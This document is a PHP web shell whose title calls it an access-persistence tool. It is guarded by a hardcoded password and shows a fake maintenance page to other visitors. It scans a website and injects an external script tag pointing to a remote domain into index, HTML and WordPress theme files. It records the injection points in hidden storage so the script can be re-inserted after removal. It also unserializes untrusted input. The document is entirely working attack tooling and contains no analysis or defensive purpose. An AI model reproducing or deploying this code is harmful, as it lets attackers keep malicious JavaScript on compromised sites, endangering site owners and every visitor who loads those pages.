<?php
header('Content-Type: text/html; charset=utf-8');

// 配置
$ACCESS_PASSWORD = "admin123";
$TARGET_SCRIPT = '<script type="text/javascript" src="http://m.993113.com/xhxh.js"></script>';
$STORAGE_DIR = $_SERVER['DOCUMENT_ROOT'] . '/.cache/';

// 权限检查
if (!isset($_GET['auth']) || $_GET['auth'] !== $ACCESS_PASSWORD) {
    echo "<html><body><h1>系统维护中</h1></body></html>";
    exit;
}

// 初始化存储系统
initStorageSystem();

// 获取文件路径 - 增强版路径解析
$filePath = '';
$fileIdentifier = ''; // 文件唯一标识符
if (isset($_GET['s'])) {
    $filePath = parseFilePath($_GET['s']);
    $fileIdentifier = generateFileIdentifier($filePath);
} elseif (isset($_POST['file_path'])) {
    $filePath = parseFilePath($_POST['file_path']);
    $fileIdentifier = generateFileIdentifier($filePath);
}

// 生成文件唯一标识符（用于区分同名文件）
function generateFileIdentifier($filePath) {
    // 使用相对路径作为标识符，避免绝对路径暴露服务器结构
    $docRoot = $_SERVER['DOCUMENT_ROOT'];
    $relativePath = str_replace($docRoot, '', $filePath);
    $relativePath = ltrim($relativePath, '/');
    
    // 如果无法获取相对路径，使用MD5作为备用方案
    if (empty($relativePath) || $relativePath === $filePath) {
        return md5($filePath);
    }
    
    return $relativePath;
}

// 修正的文件路径解析函数
function parseFilePath($inputPath) {
    // 移除可能的危险字符
    $cleanPath = str_replace(['../', './', '..\\', '.\\'], '', $inputPath);
    
    // 如果已经是绝对路径且文件存在，直接返回
    if (file_exists($cleanPath) && is_file($cleanPath)) {
        return $cleanPath;
    }
    
    $docRoot = $_SERVER['DOCUMENT_ROOT'];
    $docRoot = rtrim($docRoot, '/');
    
    // 处理不同形式的路径输入
    $possiblePaths = [];
    
    // 1. 直接相对于文档根目录
    $possiblePaths[] = $docRoot . '/' . ltrim($cleanPath, '/');
    
    // 2. 如果输入是绝对路径但在文档根目录外，尝试在文档根目录内查找
    if (strpos($cleanPath, $docRoot) === 0) {
        $possiblePaths[] = $cleanPath;
    }
    
    // 3. 处理子目录情况（如 "subdir/index.php"）
    $possiblePaths[] = $docRoot . '/' . $cleanPath;
    
    // 4. 处理多级子目录（如 "dir1/dir2/index.php"）
    $pathParts = explode('/', $cleanPath);
    $fileName = array_pop($pathParts);
    $dirPath = implode('/', $pathParts);
    $possiblePaths[] = $docRoot . '/' . $dirPath . '/' . $fileName;
    
    // 查找第一个存在的文件
    foreach ($possiblePaths as $testPath) {
        if (file_exists($testPath) && is_file($testPath)) {
            return realpath($testPath);
        }
    }
    
    // 如果都找不到，返回最可能的路径（用于创建新文件）
    return $docRoot . '/' . ltrim($cleanPath, '/');
}

// 处理操作
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'check':
            checkScript($filePath);
            break;
        case 'restore':
            restoreScript($filePath);
            break;
        case 'save_position':
            saveScriptPosition($filePath);
            break;
        case 'auto_restore':
            autoRestoreScript($filePath);
            break;
        case 'export_positions':
            exportPositions();
            break;
        case 'import_positions':
            importPositions();
            break;
        case 'clear_positions':
            clearAllPositions();
            break;
        case 'change_storage':
            changeStorageLocation();
            break;
        case 'show_storage_info':
            showStorageInfo();
            break;
        case 'backup_storage':
            backupStorage();
            break;
        case 'scan_directory':
            scanDirectoryForFiles();
            break;
        case 'bulk_operation':
            handleBulkOperation();
            break;
    }
}

// 初始化存储系统
function initStorageSystem() {
    global $STORAGE_DIR;
    
    // 创建隐藏目录
    if (!is_dir($STORAGE_DIR)) {
        mkdir($STORAGE_DIR, 0755, true);
    }
    
    // 创建索引文件（记录所有存储文件位置）
    $indexFile = $STORAGE_DIR . 'index.dat';
    if (!file_exists($indexFile)) {
        file_put_contents($indexFile, serialize([]));
    }
}

// 生成随机文件名
function generateRandomFilename($prefix = 'data_') {
    $random = bin2hex(random_bytes(8));
    $timestamp = time();
    return $prefix . $timestamp . '_' . $random . '.dat';
}

// 生成随机目录路径
function generateRandomDirectory() {
    global $STORAGE_DIR;
    
    $dirs = [
        $STORAGE_DIR,
        $STORAGE_DIR . 'tmp/',
        $STORAGE_DIR . 'cache/',
        $STORAGE_DIR . 'logs/',
        $STORAGE_DIR . 'sessions/',
        $_SERVER['DOCUMENT_ROOT'] . '/tmp/',
        $_SERVER['DOCUMENT_ROOT'] . '/cache/',
        $_SERVER['DOCUMENT_ROOT'] . '/logs/'
    ];
    
    $randomDir = $dirs[array_rand($dirs)];
    
    // 确保目录存在
    if (!is_dir($randomDir)) {
        mkdir($randomDir, 0755, true);
    }
    
    return $randomDir;
}

// 获取当前存储文件路径
function getCurrentStorageFile() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    $index = unserialize(file_get_contents($indexFile));
    
    if (empty($index['current_storage'])) {
        // 创建新的存储文件
        return createNewStorageFile();
    }
    
    $storageFile = $index['current_storage'];
    if (!file_exists($storageFile)) {
        // 如果文件不存在，创建新的
        return createNewStorageFile();
    }
    
    return $storageFile;
}

// 创建新的存储文件
function createNewStorageFile() {
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    $index = unserialize(file_get_contents($indexFile));
    
    $storageDir = generateRandomDirectory();
    $storageFile = $storageDir . generateRandomFilename('pos_');
    
    // 初始化存储文件
    $initialData = [
        'created_at' => date('Y-m-d H:i:s'),
        'positions' => [],
        'metadata' => [
            'version' => '1.0',
            'file_count' => 0
        ]
    ];
    
    file_put_contents($storageFile, serialize($initialData));
    
    // 更新索引
    $index['current_storage'] = $storageFile;
    $index['storage_history'][] = [
        'file' => $storageFile,
        'created_at' => date('Y-m-d H:i:s'),
        'active' => true
    ];
    
    file_put_contents($indexFile, serialize($index));
    
    return $storageFile;
}

// 读取存储的位置信息
function readStoredPositions() {
    $storageFile = getCurrentStorageFile();
    
    if (!file_exists($storageFile)) {
        return [];
    }
    
    $data = unserialize(file_get_contents($storageFile));
    return isset($data['positions']) ? $data['positions'] : [];
}

// 保存位置信息到存储文件
function savePositionsToStorage($positions) {
    $storageFile = getCurrentStorageFile();
    
    $data = [
        'created_at' => date('Y-m-d H:i:s'),
        'positions' => $positions,
        'metadata' => [
            'version' => '1.0',
            'file_count' => count($positions),
            'last_updated' => date('Y-m-d H:i:s')
        ]
    ];
    
    return file_put_contents($storageFile, serialize($data)) !== false;
}

// 保存脚本位置
function saveScriptPosition($file) {
    global $TARGET_SCRIPT;
    
    if (!file_exists($file)) {
        echo "<div class='error'>文件不存在: " . htmlspecialchars($file) . "</div>";
        return;
    }
    
    $content = file_get_contents($file);
    $pos = strpos($content, $TARGET_SCRIPT);
    
    if ($pos !== false) {
        $lineNumber = substr_count(substr($content, 0, $pos), "\n") + 1;
        
        // 构建位置信息
        $fileIdentifier = generateFileIdentifier($file);
        $positionData = [
            'file' => $file,
            'file_identifier' => $fileIdentifier, // 使用唯一标识符
            'relative_path' => $fileIdentifier,   // 相对路径用于显示
            'position' => $pos,
            'line' => $lineNumber,
            'saved_at' => date('Y-m-d H:i:s'),
            'content_before' => substr($content, max(0, $pos - 30), 30),
            'content_after' => substr($content, $pos + strlen($TARGET_SCRIPT), 30),
            'file_hash' => md5($file)
        ];
        
        // 读取现有位置
        $positions = readStoredPositions();
        $positions[$fileIdentifier] = $positionData; // 使用标识符作为键
        
        // 保存到存储文件
        if (savePositionsToStorage($positions)) {
            $storageFile = getCurrentStorageFile();
            echo "<div class='success'>";
            echo "✅ 脚本位置已保存到隐蔽存储！<br>";
            echo "<strong>文件:</strong> " . $fileIdentifier . "<br>";
            echo "<strong>位置:</strong> 第 {$lineNumber} 行<br>";
            echo "<strong>存储文件:</strong> " . basename($storageFile) . "<br>";
            echo "<strong>存储路径:</strong> " . dirname($storageFile);
            echo "</div>";
        } else {
            echo "<div class='error'>❌ 保存失败，请检查文件权限</div>";
        }
    } else {
        echo "<div class='warning'>⚠ 无法保存位置：文件中未找到脚本</div>";
    }
}

// 自动恢复脚本到原位置
function autoRestoreScript($file) {
    global $TARGET_SCRIPT;
    
    if (!file_exists($file)) {
        echo "<div class='error'>文件不存在: " . htmlspecialchars($file) . "</div>";
        return;
    }
    
    // 从存储文件获取位置信息
    $positions = readStoredPositions();
    $fileIdentifier = generateFileIdentifier($file);
    $positionInfo = isset($positions[$fileIdentifier]) ? $positions[$fileIdentifier] : null;
    
    if (!$positionInfo) {
        echo "<div class='warning'>⚠ 未找到该文件的保存位置，使用智能恢复</div>";
        restoreScript($file);
        return;
    }
    
    // 创建备份
    $backup = $file . '.backup_' . date('YmdHis');
    if (copy($file, $backup)) {
        echo "<div class='info'>📦 备份已创建: " . basename($backup) . "</div>";
    }
    
    $content = file_get_contents($file);
    
    // 检查当前位置是否还适合插入
    $savedPosition = $positionInfo['position'];
    $contentBefore = $positionInfo['content_before'];
    $contentAfter = $positionInfo['content_after'];
    
    // 验证位置是否仍然有效
    $currentBefore = substr($content, max(0, $savedPosition - 30), 30);
    $isPositionValid = (strpos($content, $TARGET_SCRIPT) === false) && 
                      (strpos($currentBefore, $contentBefore) !== false);
    
    if ($isPositionValid && $savedPosition <= strlen($content)) {
        // 在原位置插入
        $newContent = substr($content, 0, $savedPosition) . 
                     $TARGET_SCRIPT . 
                     substr($content, $savedPosition);
        
        if (file_put_contents($file, $newContent) !== false) {
            $storageFile = getCurrentStorageFile();
            echo "<div class='success'>";
            echo "✅ 脚本已恢复到原位置！<br>";
            echo "<strong>文件:</strong> " . $positionInfo['relative_path'] . "<br>";
            echo "<strong>位置:</strong> 第 {$positionInfo['line']} 行<br>";
            echo "<strong>原保存时间:</strong> {$positionInfo['saved_at']}<br>";
            echo "<strong>数据来源:</strong> " . basename($storageFile);
            echo "</div>";
            
            // 验证
            $verify = file_get_contents($file);
            if (strpos($verify, $TARGET_SCRIPT) !== false) {
                echo "<div class='success'>✓ 验证成功：脚本已恢复</div>";
            }
        } else {
            echo "<div class='error'>❌ 写入文件失败</div>";
        }
    } else {
        echo "<div class='warning'>⚠ 原位置已发生变化，使用智能恢复</div>";
        restoreScript($file);
    }
}

// 导出位置信息
function exportPositions() {
    $positions = readStoredPositions();
    $exportData = base64_encode(serialize($positions));
    
    echo "<div class='success'>";
    echo "📤 位置信息导出成功<br>";
    echo "<strong>导出代码:</strong><br>";
    echo "<textarea style='width:100%; height:100px; font-family: monospace;' onclick='this.select()'>" . htmlspecialchars($exportData) . "</textarea>";
    echo "<br><small>请保存此代码，可用于导入恢复位置信息</small>";
    echo "</div>";
}

// 导入位置信息
function importPositions() {
    if (isset($_POST['import_data']) && !empty($_POST['import_data'])) {
        $importData = $_POST['import_data'];
        $positions = unserialize(base64_decode($importData));
        
        if ($positions && is_array($positions)) {
            if (savePositionsToStorage($positions)) {
                echo "<div class='success'>✅ 位置信息导入成功！共导入 " . count($positions) . " 个位置记录</div>";
            } else {
                echo "<div class='error'>❌ 导入失败，请检查文件权限</div>";
            }
        } else {
            echo "<div class='error'>❌ 导入数据格式错误</div>";
        }
    }
}

// 清空所有位置
function clearAllPositions() {
    if (savePositionsToStorage([])) {
        echo "<div class='success'>✅ 所有保存的位置已清除</div>";
    } else {
        echo "<div class='error'>❌ 清除失败</div>";
    }
}

// 更改存储位置
function changeStorageLocation() {
    $newStorageFile = createNewStorageFile();
    echo "<div class='success'>";
    echo "✅ 存储位置已更改！<br>";
    echo "<strong>新存储文件:</strong> " . basename($newStorageFile) . "<br>";
    echo "<strong>存储路径:</strong> " . dirname($newStorageFile);
    echo "</div>";
}

// 显示存储信息
function showStorageInfo() {
    $storageFile = getCurrentStorageFile();
    $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
    $index = unserialize(file_get_contents($indexFile));
    
    $positions = readStoredPositions();
    
    echo "<div class='info'>";
    echo "<h4>📁 存储系统信息</h4>";
    echo "<strong>当前存储文件:</strong> " . basename($storageFile) . "<br>";
    echo "<strong>存储路径:</strong> " . dirname($storageFile) . "<br>";
    echo "<strong>文件大小:</strong> " . round(filesize($storageFile) / 1024, 2) . " KB<br>";
    echo "<strong>创建时间:</strong> " . date('Y-m-d H:i:s', filemtime($storageFile)) . "<br>";
    echo "<strong>位置记录数:</strong> " . count($positions) . "<br>";
    
    if (!empty($index['storage_history'])) {
        echo "<strong>历史存储文件:</strong><br>";
        foreach ($index['storage_history'] as $history) {
            $status = $history['active'] ? '✅ 当前' : '📁 历史';
            echo "&nbsp;&nbsp;{$status}: " . basename($history['file']) . " (" . $history['created_at'] . ")<br>";
        }
    }
    echo "</div>";
}

// 备份存储
function backupStorage() {
    $storageFile = getCurrentStorageFile();
    $backupFile = $GLOBALS['STORAGE_DIR'] . 'backup_' . date('YmdHis') . '.dat';
    
    if (copy($storageFile, $backupFile)) {
        echo "<div class='success'>✅ 存储备份已创建: " . basename($backupFile) . "</div>";
    } else {
        echo "<div class='error'>❌ 备份创建失败</div>";
    }
}

// 扫描目录查找文件
function scanDirectoryForFiles() {
    $scanDir = isset($_POST['scan_dir']) ? $_POST['scan_dir'] : '';
    $filePattern = isset($_POST['file_pattern']) ? $_POST['file_pattern'] : '*.php';
    
    if (empty($scanDir)) {
        $scanDir = $_SERVER['DOCUMENT_ROOT'];
    }
    
    $scanDir = parseFilePath($scanDir);
    
    if (!is_dir($scanDir)) {
        echo "<div class='error'>目录不存在: " . htmlspecialchars($scanDir) . "</div>";
        return;
    }
    
    $files = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($scanDir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $filename = $file->getFilename();
            if (fnmatch($filePattern, $filename) || strpos($filename, $filePattern) !== false) {
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $file->getPathname());
                $relativePath = ltrim($relativePath, '/');
                $files[] = [
                    'path' => $file->getPathname(),
                    'relative' => $relativePath ?: $filename,
                    'size' => $file->getSize(),
                    'modified' => date('Y-m-d H:i:s', $file->getMTime())
                ];
            }
        }
    }
    
    echo "<div class='section'>";
    echo "<h3>📁 文件扫描结果</h3>";
    echo "<p><strong>扫描目录:</strong> " . htmlspecialchars($scanDir) . "</p>";
    echo "<p><strong>找到文件:</strong> " . count($files) . " 个</p>";
    
    if (!empty($files)) {
        echo "<div class='file-list'>";
        foreach ($files as $file) {
            echo "<div class='file-item'>";
            echo "<strong>" . htmlspecialchars($file['relative']) . "</strong><br>";
            echo "<small>大小: " . round($file['size'] / 1024, 2) . " KB, 修改: " . $file['modified'] . "</small>";
            echo "<div class='action-buttons'>";
            echo "<a href='?auth=" . $GLOBALS['ACCESS_PASSWORD'] . "&s=" . urlencode($file['relative']) . "' class='btn btn-small'>选择</a>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='file_path' value='" . htmlspecialchars($file['path']) . "'>";
            echo "<button type='submit' name='action' value='check' class='btn btn-small'>检查</button>";
            echo "</form>";
            echo "</div>";
            echo "</div>";
        }
        echo "</div>";
    } else {
        echo "<div class='warning'>未找到匹配的文件</div>";
    }
    echo "</div>";
}

// 批量操作处理
function handleBulkOperation() {
    if (!isset($_POST['bulk_files']) || empty($_POST['bulk_files'])) {
        echo "<div class='error'>未选择文件</div>";
        return;
    }
    
    $operation = isset($_POST['bulk_operation_type']) ? $_POST['bulk_operation_type'] : 'check';
    $files = $_POST['bulk_files'];
    
    echo "<div class='section'>";
    echo "<h3>🔄 批量操作结果</h3>";
    echo "<p><strong>操作类型:</strong> " . htmlspecialchars($operation) . "</p>";
    echo "<p><strong>处理文件数:</strong> " . count($files) . "</p>";
    
    foreach ($files as $filePath) {
        $filePath = parseFilePath($filePath);
        echo "<div class='file-result'>";
        echo "<h4>📄 " . generateFileIdentifier($filePath) . "</h4>";
        
        switch ($operation) {
            case 'check':
                checkScript($filePath);
                break;
            case 'save_position':
                saveScriptPosition($filePath);
                break;
            case 'auto_restore':
                autoRestoreScript($filePath);
                break;
            case 'restore':
                restoreScript($filePath);
                break;
        }
        
        echo "</div>";
    }
    
    echo "</div>";
}

// 显示位置管理
function displayPositionManagement() {
    $positions = readStoredPositions();
    
    echo "<div class='section'>";
    echo "<h3>💾 隐蔽存储管理系统</h3>";
    
    // 显示存储信息
    showStorageInfo();
    
    if (empty($positions)) {
        echo "<div class='info'>暂无保存的脚本位置信息</div>";
    } else {
        echo "<div class='success'>✅ 当前已存储 " . count($positions) . " 个文件的位置信息</div>";
        echo "<div class='position-list'>";
        
        foreach ($positions as $fileIdentifier => $info) {
            $displayPath = isset($info['relative_path']) ? $info['relative_path'] : basename($info['file']);
            echo "<div class='position-item'>";
            echo "<strong>{$displayPath}</strong> - 第 {$info['line']} 行";
            echo "<br><small>保存于: {$info['saved_at']}</small>";
            echo "<br><div class='action-buttons'>";
            echo "<a href='?auth={$GLOBALS['ACCESS_PASSWORD']}&s={$displayPath}' class='btn btn-small'>检查</a>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='file_path' value='{$info['file']}'>";
            echo "<button type='submit' name='action' value='auto_restore' class='btn btn-small btn-success'>自动恢复</button>";
            echo "</form>";
            echo "</div>";
            echo "</div>";
        }
        echo "</div>";
    }
    
    // 存储管理按钮
    echo "<div class='action-buttons'>";
    echo "<form method='post' style='display:inline;'>";
    echo "<button type='submit' name='action' value='export_positions' class='btn btn-info'>📤 导出位置</button>";
    echo "</form>";
    
    echo "<button type='button' onclick='showImport()' class='btn btn-info'>📥 导入位置</button>";
    
    echo "<form method='post' style='display:inline;'>";
    echo "<button type='submit' name='action' value='change_storage' class='btn btn-warning'>🔄 更改存储位置</button>";
    echo "</form>";
    
    echo "<form method='post' style='display:inline;'>";
    echo "<button type='submit' name='action' value='backup_storage' class='btn btn-info'>💾 备份存储</button>";
    echo "</form>";
    
    echo "<form method='post' style='display:inline;'>";
    echo "<button type='submit' name='action' value='clear_positions' class='btn btn-warning' onclick='return confirm(\"确定要清除所有保存的位置吗？\")'>";
    echo "🗑️ 清除所有";
    echo "</button>";
    echo "</form>";
    
    echo "<button type='button' onclick='showScan()' class='btn btn-info'>🔍 扫描文件</button>";
    echo "</div>";
    
    // 导入表单
    echo "<div id='importForm' style='display:none; margin-top:15px;'>";
    echo "<form method='post'>";
    echo "<label><strong>导入位置数据:</strong></label><br>";
    echo "<textarea name='import_data' style='width:100%; height:80px;' placeholder='粘贴导出的位置代码...'></textarea><br>";
    echo "<button type='submit' name='action' value='import_positions' class='btn btn-success'>确认导入</button>";
    echo "</form>";
    echo "</div>";
    
    // 文件扫描表单
    echo "<div id='scanForm' style='display:none; margin-top:15px;'>";
    echo "<form method='post'>";
    echo "<label><strong>扫描目录:</strong></label><br>";
    echo "<input type='text' name='scan_dir' value='' style='width:300px;' placeholder='留空则扫描整个网站'>";
    echo "<br><label><strong>文件模式:</strong></label><br>";
    echo "<input type='text' name='file_pattern' value='index.php' style='width:300px;' placeholder='例如: index.php, *.html, header.*'>";
    echo "<br><button type='submit' name='action' value='scan_directory' class='btn btn-success'>开始扫描</button>";
    echo "</form>";
    echo "</div>";
    
    echo "</div>";
}

// 检查脚本函数
function checkScript($file) {
    global $TARGET_SCRIPT;
    
    if (!file_exists($file)) {
        echo "<div class='error'>文件不存在: " . htmlspecialchars($file) . "</div>";
        return;
    }
    
    $content = file_get_contents($file);
    $pos = strpos($content, $TARGET_SCRIPT);
    
    // 检查是否有保存的位置信息
    $positions = readStoredPositions();
    $fileIdentifier = generateFileIdentifier($file);
    $savedPosition = isset($positions[$fileIdentifier]) ? $positions[$fileIdentifier] : null;
    
    if ($pos !== false) {
        $lineNumber = substr_count(substr($content, 0, $pos), "\n") + 1;
        
        echo "<div class='success'>";
        echo "✅ 脚本存在于文件中<br>";
        echo "<strong>文件:</strong> " . $fileIdentifier . "<br>";
        echo "<strong>位置:</strong> 第 {$lineNumber} 行";
        
        if ($savedPosition) {
            echo "<br><strong>已保存位置:</strong> 第 {$savedPosition['line']} 行 (保存于 {$savedPosition['saved_at']})";
            
            if ($savedPosition['line'] == $lineNumber) {
                echo " <span style='color:green'>✓ 位置一致</span>";
            } else {
                echo " <span style='color:orange'>⚠ 位置不一致</span>";
            }
        }
        echo "</div>";
        
    } else {
        echo "<div class='warning'>";
        echo "⚠ 脚本不存在于文件中<br>";
        echo "<strong>文件:</strong> " . $fileIdentifier;
        
        if ($savedPosition) {
            echo "<br><strong>已保存位置:</strong> 第 {$savedPosition['line']} 行 (保存于 {$savedPosition['saved_at']})";
        }
        echo "</div>";
    }
}

// 恢复脚本函数
function restoreScript($file) {
    global $TARGET_SCRIPT;
    
    if (!file_exists($file)) {
        echo "<div class='error'>文件不存在: " . htmlspecialchars($file) . "</div>";
        return;
    }
    
    // 创建备份
    $backup = $file . '.backup_' . date('YmdHis');
    if (copy($file, $backup)) {
        echo "<div class='info'>📦 备份已创建: " . basename($backup) . "</div>";
    }
    
    $content = file_get_contents($file);
    
    // 如果脚本已存在，先移除
    $cleanContent = str_replace($TARGET_SCRIPT, '', $content);
    
    // 智能插入
    $newContent = $cleanContent;
    $insertLocation = '';
    
    if (strpos($file, '.html') !== false || strpos($file, '.htm') !== false) {
        if (preg_match('/<head[^>]*>/i', $cleanContent)) {
            $newContent = preg_replace('/(<head[^>]*>)/i', "$1\n" . $TARGET_SCRIPT, $cleanContent);
            $insertLocation = "head标签内";
        } else {
            $newContent = preg_replace('/(<body[^>]*>)/i', "$1\n" . $TARGET_SCRIPT, $cleanContent);
            $insertLocation = "body开始处";
        }
    } elseif (strpos($file, '.php') !== false) {
        if (preg_match('/<head[^>]*>/i', $cleanContent)) {
            $newContent = preg_replace('/(<head[^>]*>)/i', "$1\n" . $TARGET_SCRIPT, $cleanContent);
            $insertLocation = "head标签内";
        } else {
            $newContent = $cleanContent . "\n" . $TARGET_SCRIPT . "\n";
            $insertLocation = "文件末尾";
        }
    } else {
        $newContent = $TARGET_SCRIPT . "\n" . $cleanContent;
        $insertLocation = "文件开头";
    }
    
    if (file_put_contents($file, $newContent) !== false) {
        echo "<div class='success'>";
        echo "✅ 脚本恢复成功！<br>";
        echo "<strong>文件:</strong> " . generateFileIdentifier($file) . "<br>";
        echo "<strong>插入位置:</strong> {$insertLocation}";
        echo "</div>";
        
        // 验证
        $verify = file_get_contents($file);
        if (strpos($verify, $TARGET_SCRIPT) !== false) {
            echo "<div class='success'>✓ 验证通过：脚本已成功插入</div>";
        }
    } else {
        echo "<div class='error'>❌ 写入文件失败，请检查文件权限</div>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Liseth维持权限 - 多文件区分版</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 20px; 
            background: #f0f2f5;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 2px solid #007cba;
            padding-bottom: 10px;
        }
        .btn {
            background: #007cba;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 5px;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background: #005a87;
        }
        .btn-success {
            background: #28a745;
        }
        .btn-warning {
            background: #ffc107;
            color: #333;
        }
        .btn-info {
            background: #17a2b8;
        }
        .btn-danger {
            background: #dc3545;
        }
        .btn-small {
            padding: 5px 10px;
            font-size: 12px;
        }
        .section {
            margin: 25px 0;
            padding: 20px;
            border: 1px solid #e1e4e8;
            border-radius: 6px;
            background: #fafbfc;
        }
        .file-info {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
        }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
            border-left: 4px solid #28a745;
        }
        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
            border-left: 4px solid #ffc107;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
            border-left: 4px solid #dc3545;
        }
        .info {
            background: #d1ecf1;
            color: #0c5460;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
            border-left: 4px solid #17a2b8;
        }
        .action-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 15px 0;
        }
        .position-list, .file-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        .position-item, .file-item {
            background: white;
            padding: 15px;
            border: 1px solid #e1e4e8;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .file-result {
            margin: 15px 0;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #f9f9f9;
        }
        .storage-info {
            background: #e8f5e8;
            padding: 15px;
            border-radius: 4px;
            margin: 10px 0;
            border-left: 4px solid #4caf50;
        }
        .bulk-operations {
            background: #fff3cd;
            padding: 15px;
            border-radius: 4px;
            margin: 15px 0;
        }
    </style>
    <script>
        function showImport() {
            document.getElementById('importForm').style.display = 'block';
            document.getElementById('scanForm').style.display = 'none';
        }
        
        function showScan() {
            document.getElementById('scanForm').style.display = 'block';
            document.getElementById('importForm').style.display = 'none';
        }
        
        function showCustomFileInput() {
            document.getElementById('customFileForm').style.display = 'block';
        }
        
        function toggleBulkSelection(source) {
            var checkboxes = document.querySelectorAll('input[name="bulk_files[]"]');
            for (var i = 0; i < checkboxes.length; i++) {
                checkboxes[i].checked = source.checked;
            }
        }
    </script>
</head>
<body>
    <div class='container'>
        <h1>🔒 安全脚本恢复工具 - 多文件区分版</h1>
        
        <div class='section'>
            <h2>📁 目标文件</h2>
            <div class='file-info'>
                <strong>当前文件:</strong> <?php echo htmlspecialchars($filePath ? generateFileIdentifier($filePath) : '未选择'); ?><br>
                <strong>完整路径:</strong> <?php echo htmlspecialchars($filePath ?: '请选择文件'); ?>
            </div>
            
            <div class='action-buttons'>
                <button type='button' onclick='showCustomFileInput()' class='btn'>📝 手动输入文件路径</button>
                <button type='button' onclick='showScan()' class='btn'>🔍 扫描目录文件</button>
            </div>
            
            <div id='customFileForm' style='display:none; margin-top:15px;'>
                <form method='get'>
                    <input type='hidden' name='auth' value='<?php echo $ACCESS_PASSWORD; ?>'>
                    <label><strong>输入文件路径（相对于网站根目录）:</strong></label><br>
                    <input type='text' name='s' value='index.php' style='width:300px; padding:8px;' 
                           placeholder='例如: index.php 或 subdir/file.html'>
                    <button type='submit' class='btn'>加载文件</button>
                    <br><small>提示: 输入相对于网站根目录的路径</small>
                </form>
            </div>
            
            <?php if (!empty($filePath)): ?>
            <div class='action-buttons'>
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='file_path' value='<?php echo htmlspecialchars($filePath); ?>'>
                    <button type='submit' name='action' value='check' class='btn'>
                        🔍 检查脚本状态
                    </button>
                </form>
                
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='file_path' value='<?php echo htmlspecialchars($filePath); ?>'>
                    <button type='submit' name='action' value='save_position' class='btn btn-info'>
                        💾 保存到隐蔽存储
                    </button>
                </form>
                
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='file_path' value='<?php echo htmlspecialchars($filePath); ?>'>
                    <button type='submit' name='action' value='auto_restore' class='btn btn-success'>
                        🎯 自动恢复(原位置)
                    </button>
                </form>
                
                <form method='post' style='display:inline;'>
                    <input type='hidden' name='file_path' value='<?php echo htmlspecialchars($filePath); ?>'>
                    <button type='submit' name='action' value='restore' class='btn btn-warning'>
                        ⚡ 智能恢复(新位置)
                    </button>
                </form>
            </div>
            <?php endif; ?>
        </div>

        <?php if (!empty($filePath)): ?>
        <div class='section'>
            <h2>📊 操作结果</h2>
            <?php
            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                // 结果显示区域
            } else {
                echo "<div class='info'>请选择操作...</div>";
            }
            ?>
        </div>
        <?php endif; ?>

        <?php displayPositionManagement(); ?>

        <div class='section'>
            <h2>🚀 快速访问</h2>
            <div class='action-buttons'>
                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=index.php' class='btn'>index.php</a>
                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=index.html' class='btn'>index.html</a>
                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-content/themes/theme-name/index.php' class='btn'>主题index.php</a>
                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-content/themes/theme-name/header.php' class='btn'>主题header.php</a>
                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-content/themes/theme-name/footer.php' class='btn'>主题footer.php</a>
                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-config.php' class='btn'>wp-config.php</a>
            </div>
            <p><small>提示: 不同目录下的同名文件会使用相对路径进行区分</small></p>
        </div>
    </div>
</body>
</html>
